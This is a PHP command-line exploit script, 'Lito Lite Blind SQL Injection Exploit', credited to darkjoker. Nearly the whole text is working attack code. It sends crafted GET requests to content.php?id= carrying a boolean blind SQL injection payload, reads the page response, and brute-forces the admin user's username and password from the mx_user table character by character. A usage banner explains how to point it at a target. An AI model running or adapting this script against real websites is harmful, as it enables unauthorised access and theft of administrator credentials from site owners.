#!/usr/bin/php
&lt;?

function query ($fld, $pos, $ord)
{
	$sql = &quot;x&#039; OR ASCII(SUBSTRING((SELECT {$fld} FROM mx_user WHERE uid = 1),{$pos},1))={$ord} OR &#039;1&#039; = &#039;2&quot;;
	$sql = str_replace (&quot; &quot;, &quot;%20&quot;, $sql);
	$sql = str_replace (&quot;&#039;&quot;, &quot;%27&quot;, $sql);
	return $sql;
}
function check ($host, $path, $fld, $pos, $char)
{
	$fp = fsockopen ($host, 80);
	$char = ord ($char);

	$query = query ($fld, $pos, $char);

	$req =  &quot;GET {$path}/content.php?id={$query} HTTP1.1\r\n&quot;.
		&quot;Host: {$host}\r\n&quot;.
		&quot;Connection: Close\r\n\r\n&quot;;

	fputs ($fp, $req);

	while (!feof ($fp))
		$cont .= trim (fgets ($fp, 1024));

	fclose ($fp);

	$x = array ();

	preg_match (&quot;/&lt;div id=\&quot;wrapper\&quot;&gt;(.+?)div&gt;/&quot;, $cont, $x);

	if (strlen ($x [1]) == 2)
		return false;
	else
		return true;
}

function brute ($host, $path, $fld, $key)
{
	$pos = 1;
	$chr = 0;
	while ($chr &lt; strlen ($key))
	{
		if (check ($host, $path, $fld, $pos, $key [$chr]))
		{
			$res .= $key [$chr];
			$chr = -1;
			$pos++;
		}
		$chr++;
	}
	return $res;
}

function usage ()
{
	echo &quot;[+] Lito Lite Blind SQL Injection Exploit\n&quot;.
	     &quot;[+] Author: darkjoker ~ http://darkjokerside.altervista.org ~ darkjoker93[at]gmail[dot]com\n&quot;.
	     &quot;[+] Usage: php &quot; . $argv [0] . &quot; &lt;hostname&gt; &lt;path&gt; [key]\n&quot;.
	     &quot;[+] Ex. php &quot;. $argv [0] . &quot; localhost /lito_lite abcdefghijklmnopqrstuvwxyz0123456789\n&quot;.
	     &quot;[+] Greetz to athos, marco6\n&quot;;
	exit ();
}


if (count ($argv) &lt; 3)
	usage ();

$host = $argv [1];
$path = $argv [2];
if (empty ($argv [3]))
	$key = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;;
else
	$key = $argv [3];

echo &quot;[+] Username: &quot; . brute ($host, $path, &quot;username&quot;, $key) . &quot;\n&quot;.
     &quot;[+] Password: &quot; . brute ($host, $path, &quot;password&quot;, $key) . &quot;\n&quot;;

?&gt;